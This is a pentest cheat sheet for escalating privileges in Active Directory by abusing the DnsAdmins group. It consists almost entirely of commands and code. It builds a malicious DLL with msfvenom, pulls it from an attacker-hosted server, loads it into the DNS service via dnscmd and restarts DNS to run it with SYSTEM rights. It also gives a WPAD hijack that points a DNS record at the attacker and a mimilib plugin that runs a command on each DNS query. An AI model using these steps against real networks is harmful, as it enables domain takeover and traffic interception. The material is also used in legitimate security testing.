# DNS Admins

## Approach to Exploiting DnsAdmins

### 1. Generate a Malicious DLL

```bash
msfvenom -p windows/x64/exec cmd='<command>' -f dll -o <dll_name>.dll
```

### 2. Host DLL on an HTTP Server

```bash
python3 -m http.server <port>
```

### 3. Transfer DLL to Target Machine

```powershell
wget "http://<attacker_ip>:<port>/<dll_name>.dll" -outfile "<dll_name>.dll"
```

### 4. Verify Membership in DnsAdmins Group

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

### 5. Load Custom DLL into DNS Server Configuration

```cmd
dnscmd.exe /config /serverlevelplugindll <dll_path>
```

### 6. Check Permissions on DNS Service

Get the user SID:

```cmd
wmic useraccount where name="<user>" get sid
```

View DNS service permissions:

```cmd
sc.exe sdshow DNS
```

### 7. Restart DNS Service to Trigger Payload

```cmd
sc stop dns
sc start dns
```

### 8. Verify Exploitation

```cmd
net group "Domain Admins" /dom
```

### 9. Cleanup

Check registry for the DLL entry:

```cmd
reg query \\<target_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Remove the DLL entry:

```cmd
reg delete \\<target_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Restart DNS:

```cmd
sc.exe start dns
sc query dns
```

### 10. Alternative Exploit - WPAD Attack

Disable WPAD blocking:

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc_hostname>
```

Create a WPAD DNS record:

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain_name> -ComputerName <dc_hostname> -IPv4Address <attacker_ip>
```

## Commands Used

* `msfvenom`
* `python3 -m http.server`
* `wget`
* `dnscmd.exe`
* `wmic`
* `sc.exe`
* `net`
* `reg`
* `Set-DnsServerGlobalQueryBlockList`
* `Add-DnsServerResourceRecordA`

## PowerShell Cmdlets

```powershell
Get-ADGroupMember
Set-DnsServerGlobalQueryBlockList
Add-DnsServerResourceRecordA
```

## Using mimilib.dll

Minimal example of `kdns.c` logic to execute a command when DNS queries are processed:

```c
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE *kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if (kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```
